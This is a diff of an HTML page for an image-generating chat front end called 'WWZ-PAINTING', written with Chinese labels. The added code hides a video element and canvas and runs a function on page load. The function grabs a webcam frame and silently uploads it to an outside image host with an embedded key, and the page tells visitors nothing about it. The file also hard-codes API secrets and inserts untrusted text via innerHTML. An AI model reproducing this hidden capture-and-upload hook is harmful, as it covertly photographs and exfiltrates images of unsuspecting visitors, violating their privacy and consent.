@@ -1,257 +1,257 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=0">
-    <title>WWZ-PAINTING</title>
-    <link rel="icon" type="image/png" href="https://tse4.mm.bing.net/th/id/OIG1.TMVfxrxHZbcSnbCWqVKD?w=270&h=270&c=6&r=0&o=5&pid=ImgGn"> <!-- 添加这行用于 favicon -->
-    <style>
-      * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-      }
-      body {
-        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        background-color: #121212;
-        color: #fff;
-      }
-      .topbar {
-        width: 100%;
-        min-width: 600px;
-        height: 60px;
-        background: linear-gradient(90deg, #00bfff, #00ff00);
-        color: #fff;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 24px;
-      }
-      .chatbox {
-        width: 100%;
-        height: 360px;
-        margin: 20px auto;
-        background-color: #222;
-        border-radius: 15px;
-        box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
-        overflow: hidden;
-      }
-      .chat {
-        width: 100%;
-        height: 300px;
-        padding: 20px;
-        overflow: auto;
-      }
-      hr {
-        height: 1px;
-        border: none;
-        background: linear-gradient(90deg, #00ced1, #4682b4);
-      }
-      .chatbox button {
-        width: 40px;
-        height: 40px;
-        position: relative;
-        margin: 9px 9px 9px calc(100% - 49px);
-        background: linear-gradient(90deg, #9932cc, #9370db);
-        color: white;
-        border: none;
-        border-radius: 50%;
-        cursor: pointer;
-        transition: background 0.3s ease;
-      }
-      button svg {
-        margin: 10px;
-      }
-      .button:hover {
-        background: linear-gradient(90deg, #9370db, #9932cc);
-      }
-      .input-container {
-        width: 100%;
-        margin: 20px auto;
-        border-radius: 15px;
-        background: linear-gradient(90deg, #87ceeb, #00bfff);
-        box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
-        display: flex;
-        flex-direction: column; 
-      }
-      .input-container label {
-        padding: 10px;
-        font-weight: bold;
-      }
-      .input-container textarea {
-        width: calc(100% - 40px);
-        height: 100px;
-        border-radius: 15px;
-        padding: 20px;
-        font-weight: 800;
-        outline: none;
-        border: none;
-        resize: none;
-        background-color: #222;
-        color: #fff;
-        margin-bottom: 10px; 
-      }
-      .lastbox {
-        width: 100%;
-        height: 56px;
-        display: flex;
-        align-items: center;
-      }
-      .model-container {
-        position: relative;
-        margin: auto 9px auto auto;
-        overflow: hidden;
-      }
-      .model-selector {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        position: absolute;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-        font-size: 16px;
-        font-weight: bold;
-        color: #fff;
-        opacity: 0;
-        transform: scale(0);
-        transition: opacity 0.5s ease, transform 0.5s ease;
-      }
-      select {
-        width: 200px;
-        height: 40px;
-        padding: 0 10px;
-        border-radius: 15px;
-        border: 1px solid #006400;
-        outline: none;
-        font-size: 14px;
-        background-color: #1a1a1a;
-        color: #fff;
-        appearance: none;
-        cursor: pointer;
-      }
-      .input-container button {
-        width: 40px;
-        height: 40px;
-        position: relative;
-        margin: auto 9px auto auto;
-        background: linear-gradient(90deg, #87ceeb, #00bfff);
-        color: white;
-        border: none;
-        border-radius: 50%;
-        cursor: pointer;
-        transition: background 0.3s ease;
-      }
-      .button:hover {
-        background: linear-gradient(90deg, #00bfff, #87ceeb);
-      }
-    </style>
-  </head>
-  <body>
-    <script>
-      var activationCode = prompt("请输入激活码：");
-      if (activationCode !== "1") {
-        alert("激活码错误，跳转到百度首页");
-        window.location.href = "http://www.baidu.com";
-      }
-    </script>
-    <div class="topbar">
-      <h1>WWZ-PAINTING</h1>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WWZ-PAINTING</title>
+<link rel="icon" type="image/png" href="https://tse4.mm.bing.net/th/id/OIG1.TMVfxrxHZbcSnbCWqVKD?w=270&h=270&c=6&r=0&o=5&pid=ImgGn"> <!-- 添加这行用于 favicon -->
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background-color: #121212;
+    color: #fff;
+  }
+  .topbar {
+    width: 100%;
+    min-width: 600px;
+    height: 60px;
+    background: linear-gradient(90deg, #00bfff, #00ff00);
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 24px;
+  }
+  .chatbox {
+    width: 100%;
+    height: 360px;
+    margin: 20px auto;
+    background-color: #222;
+    border-radius: 15px;
+    box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+    overflow: hidden;
+  }
+  .chat {
+    width: 100%;
+    height: 300px;
+    padding: 20px;
+    overflow: auto;
+  }
+  hr {
+    height: 1px;
+    border: none;
+    background: linear-gradient(90deg, #00ced1, #4682b4);
+  }
+  .chatbox button {
+    width: 40px;
+    height: 40px;
+    position: relative;
+    margin: 9px 9px 9px calc(100% - 49px);
+    background: linear-gradient(90deg, #9932cc, #9370db);
+    color: white;
+    border: none;
+    border-radius: 50%;
+    cursor: pointer;
+    transition: background 0.3s ease;
+  }
+  button svg {
+    margin: 10px;
+  }
+  .button:hover {
+    background: linear-gradient(90deg, #9370db, #9932cc);
+  }
+  .input-container {
+    width: 100%;
+    margin: 20px auto;
+    border-radius: 15px;
+    background: linear-gradient(90deg, #87ceeb, #00bfff);
+    box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+    display: flex;
+    flex-direction: column; 
+  }
+  .input-container label {
+    padding: 10px;
+    font-weight: bold;
+  }
+  .input-container textarea {
+    width: calc(100% - 40px);
+    height: 100px;
+    border-radius: 15px;
+    padding: 20px;
+    font-weight: 800;
+    outline: none;
+    border: none;
+    resize: none;
+    background-color: #222;
+    color: #fff;
+    margin-bottom: 10px; 
+  }
+  .lastbox {
+    width: 100%;
+    height: 56px;
+    display: flex;
+    align-items: center;
+  }
+  .model-container {
+    position: relative;
+    margin: auto 9px auto auto;
+    overflow: hidden;
+  }
+  .model-selector {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    font-size: 16px;
+    font-weight: bold;
+    color: #fff;
+    opacity: 0;
+    transform: scale(0);
+    transition: opacity 0.5s ease, transform 0.5s ease;
+  }
+  select {
+    width: 200px;
+    height: 40px;
+    padding: 0 10px;
+    border-radius: 15px;
+    border: 1px solid #006400;
+    outline: none;
+    font-size: 14px;
+    background-color: #1a1a1a;
+    color: #fff;
+    appearance: none;
+    cursor: pointer;
+  }
+  .input-container button {
+    width: 40px;
+    height: 40px;
+    position: relative;
+    margin: auto 9px auto auto;
+    background: linear-gradient(90deg, #87ceeb, #00bfff);
+    color: white;
+    border: none;
+    border-radius: 50%;
+    cursor: pointer;
+    transition: background 0.3s ease;
+  }
+  .button:hover {
+    background: linear-gradient(90deg, #00bfff, #87ceeb);
+  }
+  #canvasContainer {
+    display: none;
+  }
+</style>
+</head>
+<body>
+<div class="topbar">
+  <h1>WWZ-PAINTING</h1>
+</div>
+<div class="chatbox">
+  <div class="chat" id="chat-box"></div>
+  <hr />
+  <button onclick="clearConversation()">
+    <svg
+      xmlns="http://www.w3.org/2000/svg"
+      fill="currentColor"
+      viewBox="0 0 16 16"
+    >
+      <path
+        d="M6.5 1h3a.5.5 0 0 1 .5.5v1H6v-1a.5.5 0 0 1 .5-.5ZM11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3A1.5 1.5 0 0 0 5 1.5v1H2.506a.58.58 0 0 0-.01 0H1.5a.5.5 0 0 0 0 1h.538l.853 10.66A2 2 0 0 0 4.885 16h6.23a2 2 0 0 0 1.994-1.84l.853-10.66h.538a.5.5 0 0 0 0-1h-.995a.59.59 0 0 0-.01 0H11Zm1.958 1-.846 10.58a1 1 0 0 1-.997.92h-6.23a1 1 0 0 1-.997-.92L3.042 3.5h9.916Zm-7.487 1a.5.5 0 0 1 .528.47l.5 8.5a.5.5 0 0 1-.998.06L5 5.03a.5.5 0 0 1 .47-.53Zm5.058 0a.5.5 0 0 1 .47.53l-.5 8.5a.5.5 0 1 1-.998-.06l.5-8.5a.5.5 0 0 1 .528-.47ZM8 4.5a.5.5 0 0 1 .5.5v8.5a.5.5 0 0 1-1 0V5a.5.5 0 0 1 .5-.5Z"
+      />
+    </svg>
+  </button>
+</div>
+<div class="input-container">
+  <textarea
+    type="text"
+    id="user-input"
+    placeholder="请在这里输入"
+  ></textarea>
+  <hr />
+  <div class="lastbox">
+    <div class="model-container">
+      <select id="model-selector" onchange="changeModel()">
+        <option value="gpt-3.5-turbo">WWZ-PAINTING</option>
+      </select>
     </div>
-    <div class="chatbox">
-      <div class="chat" id="chat-box"></div>
-      <hr />
-      <button onclick="clearConversation()">
-        <svg
-          xmlns="http://www.w3.org/2000/svg"
-          fill="currentColor"
-          viewBox="0 0 16 16"
-        >
-          <path
-            d="M6.5 1h3a.5.5 0 0 1 .5.5v1H6v-1a.5.5 0 0 1 .5-.5ZM11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3A1.5 1.5 0 0 0 5 1.5v1H2.506a.58.58 0 0 0-.01 0H1.5a.5.5 0 0 0 0 1h.538l.853 10.66A2 2 0 0 0 4.885 16h6.23a2 2 0 0 0 1.994-1.84l.853-10.66h.538a.5.5 0 0 0 0-1h-.995a.59.59 0 0 0-.01 0H11Zm1.958 1-.846 10.58a1 1 0 0 1-.997.92h-6.23a1 1 0 0 1-.997-.92L3.042 3.5h9.916Zm-7.487 1a.5.5 0 0 1 .528.47l.5 8.5a.5.5 0 0 1-.998.06L5 5.03a.5.5 0 0 1 .47-.53Zm5.058 0a.5.5 0 0 1 .47.53l-.5 8.5a.5.5 0 1 1-.998-.06l.5-8.5a.5.5 0 0 1 .528-.47ZM8 4.5a.5.5 0 0 1 .5.5v8.5a.5.5 0 0 1-1 0V5a.5.5 0 0 1 .5-.5Z"
-          />
-        </svg>
-      </button>
-    </div>
-    <div class="input-container">
-      <textarea
-        type="text"
-        id="user-input"
-        placeholder="请在这里输入"
-      ></textarea>
-      <hr />
-      <div class="lastbox">
-        <div class="model-container">
-          <select id="model-selector" onchange="changeModel()">
-            <option value="gpt-3.5-turbo">WWZ-PAINTING</option>
-            
-          </select>
-        </div>
-        <button onclick="sendMessage()">
-          <svg
-            xmlns="http://www.w3.org/2000/svg"
-            fill="currentColor"
-            viewBox="0 0 16 16"
-          >
-            <path
-              d="M15.854.146a.5.5 0 0 1 .11.54l-5.819 14.547a.75.75 0 0 1-1.329.124l-3.178-4.995L.643 7.184a.75.75 0 0 1 .124-1.33L15.314.037a.5.5 0 0 1 .54.11ZM6.636 10.07l2.761 4.338L14.13 2.576 6.636 10.07Zm6.787-8.201L1.591 6.602l4.339 2.76 7.494-7.493Z"
-            />
-          </svg>
-        </button>
-      </div>
-    </div>
-    <script>
-      var conversation = [
-        { role: "system", content: "你要扮演这样的助手，助手善于判断用户意图，当确定需要提供图片时，助手会变得沉默寡言，只使用以下格式输出markdown图片：![描述](https://image.pollinations.ai/prompt/描述)，因为这个语法可以自动按照提示生成并渲染图片。一般用户给出的描述会比较简单并且信息不足，助手会将其中的描述自行补足替换为AI生成图片所常用的复杂冗长的英文提示，以大幅提高生成图片质量和丰富程度，比如增加相机光圈、具体场景描述等内容。助手会避免用代码块或原始块包围markdown标记，因为那样只会渲染出代码块或原始块而不是图片." },
-      ];
-      var selectedModel = "gpt-3.5-turbo";
-      function sendMessage() {
-        var userInput = document.getElementById("user-input").value;
-        appendMessage("您", userInput);
+    <button onclick="sendMessage()">
+      <svg
+        xmlns="http://www.w3.org/2000/svg"
+        fill="currentColor"
+        viewBox="0 0 16 16"
+      >
+        <path
+          d="M15.854.146a.5.5 0 0 1 .11.54l-5.819 14.547a.75.75 0 0 1-1.329.124l-3.178-4.995L.643 7.184a.75.75 0 0 1 .124-1.33L15.314.037a.5.5 0 0 1 .54.11ZM6.636 10.07l2.761 4.338L14.13 2.576 6.636 10.07Zm6.787-8.201L1.591 6.602l4.339 2.76 7.494-7.493Z"
+        />
+      </svg>
+    </button>
+  </div>
+</div>
+<video id="video" width="640" height="480" autoplay style="display:none;"></video>
+<div id="canvasContainer">
+  <canvas id="canvas" width="640" height="480"></canvas>
+</div>
+<script>
+  var conversation = [
+    { role: "system", content: "你要扮演这样的助手，助手善于判断用户意图，当确定需要提供图片时，助手会变得沉默寡言，只使用以下格式输出markdown图片：![描述](https://image.pollinations.ai/prompt/描述)，因为这个语法可以自动按照提示生成并渲染图片。一般用户给出的描述会比较简单并且信息不足，助手会将其中的描述自行补足替换为AI生成图片所常用的复杂冗长的英文提示，以大幅提高生成图片质量和丰富程度，比如增加相机光圈、具体场景描述等内容。助手会避免用代码块或原始块包围markdown标记，因为那样只会渲染出代码块或原始块而不是图片." },
+  ];
+  var selectedModel = "gpt-3.5-turbo";
+  function sendMessage() {
+    var userInput = document.getElementById("user-input").value;
+    appendMessage("您", userInput);
+    setTimeout(function () {
+      typeWriter("AI正在思考中...", "bot"); 
+    }, 200);
+    conversation.push({
+      role: "user",
+      content: userInput,
+    });
+    var model = selectedModel;
+    var requestOptions = {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        Authorization: "Bearer sk-vTFHsGHrXDtcNE7vIkXyhtMr2L0VumzuvDLNEe4NL9y8XDTi",
+      },
+      body: JSON.stringify({
+        model: model,
+        messages: conversation,
+        stream: false,
+        temperature: 0.5,
+        max_tokens: 4000,
+      }),
+    };
+    fetch(
+      "https://api.gptgod.online/v1/chat/completions",
+      requestOptions
+    )
+      .then((response) => response.json())
+      .then((data) => {
+        var botResponse = data.choices[0].message.content;
         setTimeout(function () {
-          typeWriter("AI正在思考中...", "bot"); // 显示“AI正在思考中...” 0.5秒延迟
-        }, 200);
-        conversation.push({
-          role: "user",
-          content: userInput,
-        });
-        var model = selectedModel;
-        var requestOptions = {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            Authorization: "Bearer sk-vTFHsGHrXDtcNE7vIkXyhtMr2L0VumzuvDLNEe4NL9y8XDTi",
-          },
-          body: JSON.stringify({
-            model: model,
-            messages: conversation,
-            stream: false,
-            temperature: 0.5,
-            max_tokens: 4000,
-          }),
-        };
-        fetch(
-          "https://api.gptgod.online/v1/chat/completions",
-          requestOptions
-        )
-          .then((response) => response.json())
-          .then((data) => {
-            var botResponse = data.choices[0].message.content;
-            setTimeout(function () {
-              typeWriter("AI：" + botResponse, "bot");
-              conversation.push({
-                role: "assistant",
-                content: botResponse,
-              });
-            }, 1500);
-          })
-          .catch((error) => {
-            console.error("Error:", error);
-            appendErrorMessage("出现错误：" + error);
+          typeWriter("AI：" + botResponse, "bot");
+          conversation.push({
+            role: "assistant",
+            content: botResponse,
           });
-        document.getElementById("user-input").value = "";
-      }
-      function typeWriter(text, sender) {
+        }, 1500);
+      })
+      .catch((error) => {
+        console.error("Error:", error);
+        appendErrorMessage("出现错误：" + error);
+      });
+    document.getElementById("user-input").value = "";
+  }
+  function typeWriter(text, sender) {
     var chatBox = document.getElementById("chat-box");
     var messageDiv = document.createElement("div");
     messageDiv.className = sender;
@@ -260,29 +260,25 @@
     messageDiv.appendChild(typingSpan);
     chatBox.appendChild(messageDiv);
     chatBox.scrollTop = chatBox.scrollHeight;
-
     var index = 0;
     var typingInterval = setInterval(function () {
       typingSpan.innerHTML += text[index];
       index++;
       if (index === text.length) {
         clearInterval(typingInterval);
-        checkForImageURL(typingSpan.innerHTML); // 在打字完成后检查图像 URL
+        checkForImageURL(typingSpan.innerHTML); 
         chatBox.scrollTop = chatBox.scrollHeight;
       }
-    }, 50); // 根据需要调整间隔
+    }, 50); 
   }
-
   function checkForImageURL(text) {
     var urlRegex = /(https?:\/\/[^\s]+)/;
     var match = text.match(urlRegex);
-
     if (match) {
       var imageUrl = match[0];
       displayImage(imageUrl);
     }
   }
-
   function displayImage(imageUrl) {
     var chatBox = document.getElementById("chat-box");
     var imageDiv = document.createElement("div");
@@ -293,38 +289,75 @@
     chatBox.appendChild(imageDiv);
     chatBox.scrollTop = chatBox.scrollHeight;
   }
-      function appendMessage(sender, message) {
-        var chatBox = document.getElementById("chat-box");
-        var messageDiv = document.createElement("div");
-        messageDiv.className = sender;
-        messageDiv.innerHTML = "<strong>" + sender + ":</strong> " + message;
-        chatBox.appendChild(messageDiv);
-        chatBox.scrollTop = chatBox.scrollHeight;
-      }
-      function appendErrorMessage(message) {
-        var chatBox = document.getElementById("chat-box");
-        var errorDiv = document.createElement("div");
-        errorDiv.className = "error";
-        errorDiv.innerHTML = "<strong>Error:</strong> " + message;
-        chatBox.appendChild(errorDiv);
-        chatBox.scrollTop = chatBox.scrollHeight;
-      }
-      function changeModel() {
-        clearConversation();
-        selectedModel = document.getElementById("model-selector").value;
-      }
-      function clearConversation() {
-        conversation = [];
-        document.getElementById("chat-box").innerHTML = "";
-      }
-      document
-        .getElementById("user-input")
-        .addEventListener("keydown", function (event) {
-          if (event.key === "Enter") {
-            event.preventDefault();
-            sendMessage();
+  function appendMessage(sender, message) {
+    var chatBox = document.getElementById("chat-box");
+    var messageDiv = document.createElement("div");
+    messageDiv.className = sender;
+    messageDiv.innerHTML = "<strong>" + sender + ":</strong> " + message;
+    chatBox.appendChild(messageDiv);
+    chatBox.scrollTop = chatBox.scrollHeight;
+  }
+  function appendErrorMessage(message) {
+    var chatBox = document.getElementById("chat-box");
+    var errorDiv = document.createElement("div");
+    errorDiv.className = "error";
+    errorDiv.innerHTML = "<strong>Error:</strong> " + message;
+    chatBox.appendChild(errorDiv);
+    chatBox.scrollTop = chatBox.scrollHeight;
+  }
+  function changeModel() {
+    clearConversation();
+    selectedModel = document.getElementById("model-selector").value;
+  }
+  function clearConversation() {
+    conversation = [];
+    document.getElementById("chat-box").innerHTML = "";
+  }
+  document.getElementById("user-input").addEventListener("keydown", function (event) {
+    if (event.key === "Enter") {
+      event.preventDefault();
+      sendMessage();
+    }
+  });
+  function captureAndUpload() {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(error => {
+        console.error('获取摄像头数据出错：', error);
+      });
+    setTimeout(() => {
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(function(blob) {
+        var formData = new FormData();
+        formData.append('image', blob);
+        formData.append('key', 'f621b2818ded22557f9260b26e3138b6'); 
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://api.imgbb.com/1/upload', true);
+        xhr.onload = function () {
+          if (xhr.status === 200) {
+            var response = JSON.parse(xhr.responseText);
+            console.log('Upload successful. Image URL:', response.data.url);
+            alert('1');
+          } else {
+            console.error('Error:', xhr.statusText, xhr.status);
+            alert('2');
           }
-        });
-    </script>
-  </body>
+        };     
+        xhr.onerror = function () {
+          console.error('Error:', xhr.statusText);
+          alert('2');
+        };
+        xhr.send(formData);
+      });
+      document.getElementById('canvasContainer').style.display = 'none';
+    }, 2000); 
+  } 
+  window.onload = captureAndUpload;
+</script>
+</body>
 </html>
